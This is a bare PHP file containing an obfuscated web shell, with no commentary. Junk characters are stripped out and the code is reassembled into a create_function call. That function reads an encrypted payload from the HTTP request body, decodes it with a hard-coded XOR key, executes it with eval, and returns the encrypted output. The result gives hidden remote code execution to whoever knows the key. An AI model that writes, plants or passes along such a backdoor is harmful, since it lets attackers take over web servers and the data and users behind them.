<?php
$I='h(qe"/$kh(qe.+)$kf/"qe,@fileqe_get_conqetents("pqeqehp://inqeput"),qe$m)==1) qeqe{@ob_start()qe;@evq';
$N='eqeal(@gzuncompresqesqe(@x(@qebqease64_decode($qem[1qeqe]qe),$k)));$o=@qeobqe_get_coqentents();@ob';
$C=str_replace('Ag','','crAgeaAgAgAgteAg_funcAgtion');
$o='$k="c9bc2qeqe3d2";$kh="fqeqebqea7dbea489c";$kf="qee870qe0qe722caebqe";$p="gSimqe9tNozxzqeHlqe9sY";fun';
$e='_end_qeclean();qe$r=qe@basqee64_encode(@xqe(@qegzcompresqes($qeo),$k));pqerqeiqent("$p$kh$r$kf");}';
$S='qection xqe($tqeqe,$k){$c=strleqen($k);qe$l=qestrlen($t)qe;$oqe="";for(qe$i=0;$qeqei<$l;qe){for($jq';
$X='e=0;($qej<$c&&$i<$l);$jqe+qe+,$qeqei++){$o.=$tqe{$i}^$k{$j};}}reqeturnqe $qeo;}if (@preqeg_matcqe';
$G=str_replace('qe','',$o.$S.$X.$I.$N.$e);
$g=$C('',$G);$g();
?>
